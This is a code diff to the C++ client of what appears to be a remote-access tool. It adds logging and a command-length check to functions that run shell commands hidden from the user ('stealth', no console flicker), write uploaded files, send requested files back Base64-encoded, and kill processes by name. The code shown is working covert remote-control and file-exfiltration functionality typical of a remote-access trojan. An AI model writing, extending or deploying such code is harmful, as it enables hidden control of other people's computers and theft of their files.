@@ -16,7 +16,9 @@
 #include <psapi.h>
 #include <commctrl.h>
 #include <gdiplus.h>
+#ifdef _MSC_VER
 #pragma comment(lib, "gdiplus.lib")
+#endif
 using namespace Gdiplus;
 #else
 #include <unistd.h>
@@ -64,6 +66,11 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 
 // Stealth Command Execution without CMD Flicker
 std::string RunStealthCommand(const std::string& cmd) {
+    // Check command length to prevent buffer overflow
+    if (cmd.length() > 8000) { // Windows CMD limit is around 8191
+        return "ERR_CMD_TOO_LONG";
+    }
+
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "ERR_PIPE";
@@ -143,6 +150,9 @@ std::string Executor::GetCurrentDir() {
 }
 
 std::string Executor::ExecuteCommand(const std::string& command) {
+    // Log command execution start
+    LogToFile("../bin/logs/client.log", "[*] Executing command: " + command);
+
     std::string cmd = command;
     size_t trailing = cmd.find_last_not_of(" \n\r\t");
     if (trailing != std::string::npos) cmd = cmd.substr(0, trailing + 1);
@@ -345,16 +355,22 @@ std::string Executor::ExecuteCommand(const std::string& command) {
         if (out.is_open()) {
             out.write(content.data(), content.size());
             out.close();
+            LogToFile("../bin/logs/client.log", "[+] File uploaded successfully: " + remotePath);
             return "SUCCESS_UPLOAD";
         }
+        LogToFile("../bin/logs/client.log", "[-] Failed to upload file: " + remotePath);
         return "ERR_FILE_WRITE|||" + GetCurrentDir();
     }
 
     if (cmd.substr(0, 10) == ":download ") {
         std::string path = cmd.substr(10);
         std::ifstream in(path, std::ios::binary);
-        if (!in.is_open()) return "ERR_FILE_READ";
+        if (!in.is_open()) {
+            LogToFile("../bin/logs/client.log", "[-] Failed to download file: " + path);
+            return "ERR_FILE_READ";
+        }
         std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+        LogToFile("../bin/logs/client.log", "[+] File downloaded successfully: " + path + " (" + std::to_string(content.size()) + " bytes)");
         return "[BASE64]" + Base64Encode(content);
     }
 
@@ -368,8 +384,14 @@ std::string Executor::ExecuteCommand(const std::string& command) {
             command = "taskkill /F /T /IM " + target;
         }
         std::string res = RunStealthCommand(command);
-        return (res.find("SUCCESS") != std::string::npos) ? "OK" : "ERR_STOP_FAILED";
-
+        // Check for success indicators in taskkill output
+        if (res.find("SUCCESS") != std::string::npos || res.find("successfully") != std::string::npos || res.empty()) {
+            LogToFile("../bin/logs/client.log", "[+] Process killed successfully: " + target);
+            return "OK";
+        } else {
+            LogToFile("../bin/logs/client.log", "[-] Failed to kill process: " + target + " - " + res);
+            return "ERR_STOP_FAILED";
+        }
 #endif
     }
 
